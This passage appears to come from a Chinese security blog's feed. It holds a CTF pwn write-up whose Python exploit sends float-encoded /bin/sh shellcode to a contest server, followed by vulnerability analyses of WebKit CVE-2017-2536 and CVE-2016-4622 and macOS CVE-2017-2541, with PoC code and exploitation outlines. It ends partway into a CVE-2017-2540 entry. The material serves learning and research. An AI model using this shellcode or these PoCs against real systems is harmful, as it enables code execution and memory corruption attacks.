class="string">'3'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="2-loading"><a href="#2-loading" class="headerlink" title="2.loading"></a>2.loading</h4><pre><code>简单粗暴把输入的每个字节 /2333.0 然后直接执行</code></pre>
<p>浮点数的考察啊…google了下 <code>float shellcode</code>，就找到了原题啊…把别人exp里的1337.0改成2333.0就好了…<br>搜到了<a href="https://j31d0.github.io/writeup/2016/04/18/pctf2016-fixedpoint/">pctf 2016 fixedpoint writeup</a><br>还有这个 <a href="https://kimiyuki.net/blog/2016/04/18/plaidctf-2016-fixedpoint/">PlaidCTF 2016 fixedpoint</a></p>
<p>pctf 这个的源码,简直不要再一样好么。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">float</span>* <span class="built_in">array</span> = mmap(<span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">float</span>)*<span class="number">8192</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">int</span> temp;</span><br><span class="line">  <span class="keyword">float</span> ftemp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8192</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;temp)) <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">array</span>[i] = ((<span class="keyword">float</span>)temp)/<span class="number">1337.0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"here we go\n"</span>, <span class="number">11</span>);</span><br><span class="line">  (*(<span class="keyword">void</span>(*)())<span class="built_in">array</span>)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>附上exploit</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = [<span class="string">"\x31\xc9"</span>, <span class="comment"># xor ecx, ecx</span></span><br><span class="line">             <span class="string">"\xf7\xe1"</span>, <span class="comment"># mul ecx</span></span><br><span class="line">             <span class="string">"\x51"</span>, <span class="comment"># push ecx</span></span><br><span class="line">             <span class="string">"\xb1\xff"</span>, <span class="comment"># mov cl, 0xFF</span></span><br><span class="line">             <span class="string">"\xb5\xff"</span>, <span class="comment"># mov ch, 0xFF</span></span><br><span class="line">             <span class="string">"\x41"</span>, <span class="comment"># inc ecx</span></span><br><span class="line">             <span class="string">"\xb4\x68"</span>, <span class="comment"># mov ah, 0x68</span></span><br><span class="line">             <span class="string">"\xb0\x73"</span>, <span class="comment"># mov al, 0x73</span></span><br><span class="line">             <span class="string">"\xf7\xe1"</span>, <span class="comment"># mul ecx</span></span><br><span class="line">             <span class="string">"\xb4\x2f"</span>, <span class="comment"># mov ah, 0x2F</span></span><br><span class="line">             <span class="string">"\xb0\x2f"</span>, <span class="comment"># mov al, 0x2F</span></span><br><span class="line">             <span class="string">"\x50"</span>, <span class="comment"># push eax</span></span><br><span class="line">             <span class="string">"\xb4\x6e"</span>, <span class="comment"># mov ah, 0x6e</span></span><br><span class="line">             <span class="string">"\xb0\x69"</span>, <span class="comment"># mov al, 0x69</span></span><br><span class="line">             <span class="string">"\xf7\xe1"</span>, <span class="comment"># mul ecx</span></span><br><span class="line">             <span class="string">"\xb4\x62"</span>, <span class="comment"># mov ah, 0x62</span></span><br><span class="line">             <span class="string">"\xb0\x2f"</span>, <span class="comment"># mov al, 0x2F</span></span><br><span class="line">             <span class="string">"\x50"</span>, <span class="comment"># push eax</span></span><br><span class="line">             <span class="string">"\x31\xc0"</span>, <span class="comment"># xor eax, eax</span></span><br><span class="line">             <span class="string">"\x31\xd2"</span>, <span class="comment"># xor edx, edx</span></span><br><span class="line">             <span class="string">"\x31\xc9"</span>, <span class="comment"># xor ecx, ecx</span></span><br><span class="line">             <span class="string">"\x89\xe3"</span>, <span class="comment"># mov ebx, esp</span></span><br><span class="line">             <span class="string">"\xb0\x0b"</span>, <span class="comment"># mov al, 11</span></span><br><span class="line">             <span class="string">"\xcd\x80"</span>] <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">ints_to_send = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> shellcode:</span><br><span class="line">    z = <span class="string">"\x40"</span></span><br><span class="line">    <span class="keyword">if</span> len(instr) == <span class="number">1</span>:</span><br><span class="line">        z = <span class="string">"\x90\x40"</span></span><br><span class="line">    payload = <span class="string">"\x48"</span> + instr[::<span class="number">-1</span>] + z</span><br><span class="line">    a = struct.unpack(<span class="string">"&gt;f"</span>, payload)[<span class="number">0</span>]*<span class="number">2333</span></span><br><span class="line">    <span class="keyword">if</span> a &gt; <span class="number">2147483647</span>:</span><br><span class="line">        log.error(<span class="string">"It's too large fam."</span>)</span><br><span class="line"></span><br><span class="line">    b = str(<span class="string">"&#123;0:f&#125;"</span>.format(a)).split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    log.info(b + <span class="string">" "</span> + payload.encode(<span class="string">"hex"</span>))</span><br><span class="line">    ints_to_send.append(b)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"106.75.84.68"</span>, <span class="number">20000</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ints_to_send:</span><br><span class="line">    r.sendline(i)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="感言"><a href="#感言" class="headerlink" title="感言"></a>感言</h4><p>这个比赛让我感觉收获最大的应该是“思考”:<code>要学会自己思考，不然做再多题目都没有用。</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF Writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-2536 analysis</title>
    <url>/2019/03/24/CVE-2017-2536-analysis/</url>
    <content><![CDATA[<h2 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 : 前置知识"></a>0x00 : 前置知识</h2><ol>
<li>interpreter<br>解释器 (LLint)</li>
<li>DFG JIT<br>全称 data flow graph JIT 数据流图 JIT。是一种推测优化的技术。会开始对一个类型做出一个能够对性能好的假设，先编译一个版本，如果后面发现假设不对就会跳转回原先代码，称为 Speculation failure。DFG 是并发编译器，DFG pipeline 的每个部分都是同时运行的，包括字节码解析和分析。</li>
<li>FLT JIT<br>新的一层 FTL 实际上是 DFG Backend 的替换。会先在 DFG 的 JavaScript 函数表示转换为静态单一指派（SSA） 格式上做些 JavaScript 特性的优化。接着把 DFG IR 转换成 FTL 里用到的 B3 的 IR。最后生成机器码。</li>
</ol>
<a id="more"></a>




<p>总的来说过程就是把源码生成字节码，接着变成 DFG CPS IR，再就是 DFG SSA IR，最后成 B3 的 IR，JavaScript 的动态性就是在这些过程中一步步被消除掉的。</p>
<p>首先了解 javascript展开语法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ES6的新特性:</span><br><span class="line">	展开语法(Spread syntax), 可以在函数调用&#x2F;数组构造时, 将数组表达式或者string在语法层面展开；</span><br><span class="line">	还可以在构造字面量对象时, 将对象表达式按key-value的方式展开。</span><br><span class="line">	(译者注: 字面量一般指 [1, 2, 3] 或者 &#123;name: &quot;mdn&quot;&#125; 这种简洁的构造方式)</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(...a);</span><br><span class="line"><span class="comment">// 1 2 3</span></span><br></pre></td></tr></table></figure>



<h2 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 : 漏洞信息"></a>0x01 : 漏洞信息</h2><p>经典的jit洞 git commit : 61dbb71d92f6a9e5a72c5f784eb5ed11495b3ff7</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x7fffffff</span>);</span><br><span class="line"><span class="keyword">let</span> hax = [<span class="number">13</span>, <span class="number">37</span>, ...a, ...a];</span><br></pre></td></tr></table></figure>


<p>PoC中，hax数组的长度，需要计算，根据展开array a去计算，jit中这部分实现出了问题。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 : 漏洞分析"></a>0x02 : 漏洞分析</h2><p><a href="https://phoenhex.re/2017-06-02/arrayspread">Exploiting an integer overflow with array spreading (WebKit)</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SLOW_PATH_DECL(slow_path_new_array_with_spread)</span><br><span class="line">&#123;</span><br><span class="line">    BEGIN();</span><br><span class="line">    <span class="keyword">int</span> numItems = pc[<span class="number">3</span>].u.operand;</span><br><span class="line">    ASSERT(numItems &gt;= <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">const</span> BitVector&amp; bitVector = exec-&gt;codeBlock()-&gt;unlinkedCodeBlock()-&gt;bitVector(pc[<span class="number">4</span>].u.unsignedValue);</span><br><span class="line"></span><br><span class="line">    JSValue* values = bitwise_cast&lt;JSValue*&gt;(&amp;OP(<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算array size</span></span><br><span class="line">    <span class="comment">// poc 中的 hax array</span></span><br><span class="line">    <span class="keyword">unsigned</span> arraySize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numItems; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bitVector.get(i)) &#123;</span><br><span class="line">            JSValue value = values[-i];</span><br><span class="line">            JSFixedArray* <span class="built_in">array</span> = jsCast&lt;JSFixedArray*&gt;(value);</span><br><span class="line">            arraySize += <span class="built_in">array</span>-&gt;size();</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            arraySize += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    JSGlobalObject* globalObject = exec-&gt;lexicalGlobalObject();</span><br><span class="line">    Structure* structure = globalObject-&gt;arrayStructureForIndexingTypeDuringAllocation(ArrayWithContiguous);</span><br><span class="line"></span><br><span class="line">    JSArray* result = JSArray::tryCreateForInitializationPrivate(vm, structure, arraySize);</span><br><span class="line">    CHECK_EXCEPTION();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据计算的size，分配空间</span></span><br><span class="line">    <span class="keyword">unsigned</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numItems; i++) &#123;</span><br><span class="line">        JSValue value = values[-i];</span><br><span class="line">        <span class="keyword">if</span> (bitVector.get(i)) &#123;</span><br><span class="line">            <span class="comment">// We are spreading.</span></span><br><span class="line">            JSFixedArray* <span class="built_in">array</span> = jsCast&lt;JSFixedArray*&gt;(value);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; <span class="built_in">array</span>-&gt;size(); i++) &#123;</span><br><span class="line">                RELEASE_ASSERT(<span class="built_in">array</span>-&gt;get(i));</span><br><span class="line">                result-&gt;initializeIndex(vm, index, <span class="built_in">array</span>-&gt;get(i));</span><br><span class="line">                ++index;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// We are not spreading.</span></span><br><span class="line">            result-&gt;initializeIndex(vm, index, value);</span><br><span class="line">            ++index;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RETURN(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>size 是一个 <code>unsigned </code>，可以整数溢出。<br><code>JSObject::initializeIndex</code>无任何边界检查：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> ALL_CONTIGUOUS_INDEXING_TYPES: &#123;</span><br><span class="line">    ASSERT(i &lt; butterfly-&gt;publicLength());</span><br><span class="line">    ASSERT(i &lt; butterfly-&gt;vectorLength());</span><br><span class="line">    butterfly-&gt;contiguous()[i].<span class="built_in">set</span>(vm, <span class="keyword">this</span>, v);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure>

<p>所以poc按照以上代码逻辑之行的话，会分配一个size是0的array，但是却拷贝了 <code>2147483647 * 2 + 2</code> 即 <code>0x7fffffff * 2 + 2</code> 个数据进去，导致堆溢出。</p>
<h3 id="看commit"><a href="#看commit" class="headerlink" title="看commit"></a>看commit</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> -g --grep=<span class="string">&quot;169780&quot;</span></span><br></pre></td></tr></table></figure>
<p>或者直接sourcetree搜索</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2017-2536%20analysis/Screen%20Shot%202019-03-23%20at%2011.28.56%20PM.png"></p>
<p>这个洞在三个jit阶段都有体现，所以补了多个地方：<br><code>LLint, DFG JIT, FTL JIT</code></p>
<p>基本上都是，计算新array的length从简单粗暴的计算，改成增加了length check的计算。</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2017-2536%20analysis/Screen%20Shot%202019-03-23%20at%2011.30.08%20PM.png"></p>
<h2 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 : 利用"></a>0x03 : 利用</h2><p> TODO</p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 : 参考"></a>0x04 : 参考</h2><p><a href="https://phoenhex.re/2017-06-02/arrayspread">Exploiting an integer overflow with array spreading (WebKit)</a></p>
<p><a href="https://ming1016.github.io/2017/10/11/deeply-analyse-webkit/">深入剖析 WebKit</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>webkit</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2016-4622  analysis</title>
    <url>/2019/04/06/CVE-2016-4622-analysis/</url>
    <content><![CDATA[<h2 id="0x00-Vuln-info"><a href="#0x00-Vuln-info" class="headerlink" title="0x00 : Vuln info"></a>0x00 : Vuln info</h2><p>Vuln : <code>Out-Of-Bound Read</code><br>Webkit Version : <code>320b1fc</code><br>Source Code : <code>ArrayPrototype.cpp</code>  的slice部分逻辑</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -b CVE-2016-4662 320b1fc</span><br></pre></td></tr></table></figure>



<a id="more"></a>

<h2 id="0x01-PoC"><a href="#0x01-PoC" class="headerlink" title="0x01 : PoC"></a>0x01 : PoC</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">    a.push(i + <span class="number">0.123</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = a.slice(<span class="number">0</span>, &#123;<span class="attr">valueOf</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; a.length = <span class="number">0</span>; <span class="keyword">return</span> <span class="number">10</span>; &#125;&#125;);</span><br><span class="line"><span class="comment">// b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]</span></span><br></pre></td></tr></table></figure>


<h2 id="0x02-Analysis"><a href="#0x02-Analysis" class="headerlink" title="0x02 : Analysis"></a>0x02 : Analysis</h2><h3 id="PoC-分析"><a href="#PoC-分析" class="headerlink" title="PoC 分析"></a>PoC 分析</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">    a.push(i + <span class="number">0.123</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = a.slice(<span class="number">0</span>, &#123;<span class="attr">valueOf</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; a.length = <span class="number">0</span>; <span class="keyword">return</span> <span class="number">10</span>; &#125;&#125;);</span><br><span class="line"><span class="comment">// b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]</span></span><br></pre></td></tr></table></figure>
<p>原本想要做的是：从<code>a array</code>中取前十个元素，放入<code>b array</code>中。</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>slice</code>对应分片操作，这里<code>b数组</code>的值是取的<code>a数组</code>的前十个元素，但是这里取的时候，<code>valueOf</code>这个回调修改掉了<code>a数组</code>的长度；然而，在发生拷贝操作的时候，<code>slice</code>的实现函数并没有检查长度，就直接拷贝了数据，这就导致<code>b数组</code>取的时候访问到了<code>a数组</code>以外的内存，所以可以看到<code>b数组</code>的内容是：<code>[0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]</code><br>从<code>0.123</code>之后都是其他数据，此时已经发生了越界读。</p>
<p><code>root cause</code> : 拷贝前未做长度检查</p>
<p>未patch的代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">EncodedJSValue JSC_HOST_CALL <span class="title">arrayProtoFuncSlice</span><span class="params">(ExecState* exec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    JSObject* thisObj = exec-&gt;thisValue()</span><br><span class="line">    .toThis(exec, StrictMode)</span><br><span class="line">    .toObject(exec);</span><br><span class="line">    <span class="keyword">if</span> (!thisObj)</span><br><span class="line">        <span class="keyword">return</span> JSValue::encode(JSValue());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> length = getLength(exec, thisObj);</span><br><span class="line">    <span class="keyword">if</span> (exec-&gt;hadException())</span><br><span class="line">        <span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> begin = argumentClampedIndexFromStartOrEnd(exec, <span class="number">0</span>, length);</span><br><span class="line">    <span class="keyword">unsigned</span> end =</span><br><span class="line">    argumentClampedIndexFromStartOrEnd(exec, <span class="number">1</span>, length, length);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">pair</span>&lt;SpeciesConstructResult, JSObject*&gt; speciesResult =</span><br><span class="line">    speciesConstructArray(exec, thisObj, end - begin);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (UNLIKELY(speciesResult.first ==</span><br><span class="line">                 SpeciesConstructResult::Exception))</span><br><span class="line">        <span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行切片操作，但是没有任何检查</span></span><br><span class="line">    <span class="keyword">if</span> (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp;</span><br><span class="line">               isJSArray(thisObj))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (JSArray* result =</span><br><span class="line">            asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin))</span><br><span class="line">            <span class="keyword">return</span> JSValue::encode(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    JSObject* result;</span><br><span class="line">    <span class="keyword">if</span> (speciesResult.first == SpeciesConstructResult::CreatedObject)</span><br><span class="line">        result = speciesResult.second;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        result = constructEmptyArray(exec, <span class="literal">nullptr</span>, end - begin);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> k = begin; k &lt; end; k++, n++) &#123;</span><br><span class="line">        JSValue v = getProperty(exec, thisObj, k);</span><br><span class="line">        <span class="keyword">if</span> (exec-&gt;hadException())</span><br><span class="line">            <span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">        <span class="keyword">if</span> (v)</span><br><span class="line">            result-&gt;putDirectIndex(exec, n, v);</span><br><span class="line">    &#125;</span><br><span class="line">    setLength(exec, result, n);</span><br><span class="line">    <span class="keyword">return</span> JSValue::encode(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="0x03-Exploit"><a href="#0x03-Exploit" class="headerlink" title="0x03 : Exploit"></a>0x03 : Exploit</h2><p>这里不再赘述，原文作者写的很详细，我也是跟着他的文章调试学习的。 </p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><ol>
<li>信息泄漏</li>
<li>伪造对象(Fload64Array)</li>
<li>任意地址读写</li>
<li>读取一个function obj的地址，触发JIT生成RWX的代码</li>
<li>利用任意地址读写写入shellcode</li>
<li>执行function</li>
</ol>
<h2 id="0x04-后续"><a href="#0x04-后续" class="headerlink" title="0x04: 后续"></a>0x04: 后续</h2><h3 id="1-how-to-find-this-bug？"><a href="#1-how-to-find-this-bug？" class="headerlink" title="1. how to find this bug？"></a>1. how to find this bug？</h3><p>​    代码审计就不说了，主要是关注在一些敏感函数前后的check情况，比如复制操作，拼接操作等。</p>
<p>​        Fuzz的话，生成式和变异式都很容易覆盖到这个case，并没有很难，只是这个洞是一种模式的问题，所以在写fuzz的规则或者模版的时候要多注意。所以在看洞的时候要思考，这是一个模式的问题，还是个例。</p>
<h3 id="2-其他类似的bug"><a href="#2-其他类似的bug" class="headerlink" title="2. 其他类似的bug"></a>2. 其他类似的bug</h3><p>​    runtime中利用slide-effect来修改一些对象类型、长度等信息，来触发一些类型混淆、越界的情况很多，不仅仅在jsc引擎，但是这些基本已经成为历史了。 这种类型的漏洞，在2016年keen lab 在poc的议题中提到了很多，其中也有类似4622这个洞的一些其他漏洞。</p>
<h3 id="3-关于调试这个洞"><a href="#3-关于调试这个洞" class="headerlink" title="3. 关于调试这个洞"></a>3. 关于调试这个洞</h3><p>新版本的macos上编译有点麻烦，需要老版sdk，不想折腾的，直接装老版本的macOS虚拟机就行，这是最简单的办法；如果你选择自己编译，慢慢修错误吧。。问题太多了。</p>
<p>如果调洞，Linux也可以，直接<code>build-jsc-only</code>就好了。</p>
<p>lldb调试的话，推荐Voltron插件，同时推荐我写的<a href="https://github.com/o0xmuhe/RockLeePrj/blob/master/Tools/voltron_debug.sh">tmux脚本</a>。</p>
<h2 id="0x05-引用"><a href="#0x05-引用" class="headerlink" title="0x05:引用"></a>0x05:引用</h2><p><a href="https://paper.seebug.org/207/">攻击JavaScript引擎：一个JavaScriptCore的学习案例(CVE-2016-4622 (2016-10-27))</a></p>
<p><a href="http://www.phrack.org/papers/attacking_javascript_engines.html">attacking_javascript_engines</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>webkit</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-2541 __XGetWindowMovementGroup stackoverflow</title>
    <url>/2019/06/19/CVE-2017-2541-XGetWindowMovementGroup-stackoverflow/</url>
    <content><![CDATA[<h2 id="basic-info"><a href="#basic-info" class="headerlink" title="basic info"></a>basic info</h2><p>size用户可控，array操作时栈溢出。<br>macOS 10.12.1</p>
<a id="more"></a>

<h2 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">get_window_group_list</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3, __int64 a4, <span class="keyword">unsigned</span> <span class="keyword">int</span> *a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *total_length; <span class="comment">// r14</span></span><br><span class="line">  __int64 buffer_1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size_param; <span class="comment">// er15</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> length; <span class="comment">// eax</span></span><br><span class="line">  __int64 size_get_1; <span class="comment">// ST00_8</span></span><br><span class="line">  _QWORD *buffer; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 idx; <span class="comment">// r13</span></span><br><span class="line"></span><br><span class="line">  total_length = a5;</span><br><span class="line">  buffer_1 = a4;</span><br><span class="line">  size_param = a3;</span><br><span class="line">  v8 = get_window_group(a1);</span><br><span class="line">  v9 = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    length = CFArrayGetCount(v8);               <span class="comment">// user control</span></span><br><span class="line">    <span class="keyword">if</span> ( length &gt; size_param )</span><br><span class="line">      length = size_param;</span><br><span class="line">    *total_length = length;</span><br><span class="line">    size_get_1 = length;</span><br><span class="line">    buffer = <span class="built_in">malloc</span>(<span class="number">8L</span>L * length);              <span class="comment">// size control</span></span><br><span class="line">    idx = <span class="number">0L</span>L;</span><br><span class="line">    CFArrayGetValues(v9, <span class="number">0L</span>L, size_get_1, buffer);</span><br><span class="line">    <span class="keyword">if</span> ( *total_length )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        CFNumberGetValue(buffer[idx++], <span class="number">3L</span>L, buffer_1);<span class="comment">// buffer &#x27;s size is controled by user, overflow buffer_1 here</span></span><br><span class="line">        buffer_1 += <span class="number">4L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( idx &lt; *total_length );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *total_length = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>array</code>的<code>size</code>是用户传递的，也就是说可以控制<code>buffer</code>的大小，在中间的循环中，在内存访问操作中因为<code>size</code>用户可控，可以导致<code>buffer_1</code> 溢出。</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">CGWindowID r[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">mach_msg_return_t</span> ret;</span><br><span class="line"><span class="keyword">msg_t</span> message;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mach_port_t</span> replyPort = mig_get_reply_port();</span><br><span class="line"></span><br><span class="line"><span class="comment">//go trigger the bug!</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;message, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));</span><br><span class="line">message.header.msgh_remote_port = getport;</span><br><span class="line">message.header.msgh_local_port = replyPort;</span><br><span class="line">message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);</span><br><span class="line">message.header.msgh_size = <span class="number">40</span>;</span><br><span class="line">message.header.msgh_id = <span class="number">0x7210</span> + <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">message.NDR = NDR_record;</span><br><span class="line">message.wid = r[<span class="number">0</span>];</span><br><span class="line">message.length = <span class="number">0x2010</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo lldb ./main </span><br><span class="line">r</span><br></pre></td></tr></table></figure>

<p>难的是poc的构造，主要是传递过来的参数(array)的构造。</p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://github.com/theori-io/zer0con2018_singi">zer0con2018_singi</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>macOS</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-2540 _XGetConnectionPSN info leak</title>
    <url>/2019/06/19/CVE-2017-2540-XGetConnectionPSN-info-leak/</url>
    <content><![CDATA[<h2 id="basic-info"><a href="#basic-info" class="headerlink" title="basic info"></a>basic info</h2><p>uninitialized stack var –&gt; info leak<br>macOS 10.12.1</p>
<a id="more"></a>

